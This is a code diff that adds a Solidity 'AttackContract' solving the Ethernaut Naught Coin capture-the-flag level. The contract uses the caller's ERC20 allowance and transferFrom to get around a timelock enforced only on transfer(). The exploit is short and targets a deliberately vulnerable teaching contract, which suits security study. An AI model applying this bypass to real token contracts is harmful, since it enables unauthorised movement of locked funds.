@@ -37,3 +37,25 @@ contract NaughtCoin is ERC20 {
         }
     }
 }
+
+// https://docs.eridian.xyz/ethereum-dev/defi-challenges/ethernaut/level-15-naught-coin
+contract AttackContract {
+    address targetContractAddress;
+
+    constructor(address _targetContractAddress) {
+        targetContractAddress = _targetContractAddress;
+    }
+
+    function attack() public {
+        uint256 allowance = ERC20(targetContractAddress).allowance(
+            msg.sender,
+            address(this)
+        );
+
+        ERC20(targetContractAddress).transferFrom(
+            msg.sender,
+            address(this),
+            allowance
+        );
+    }
+}
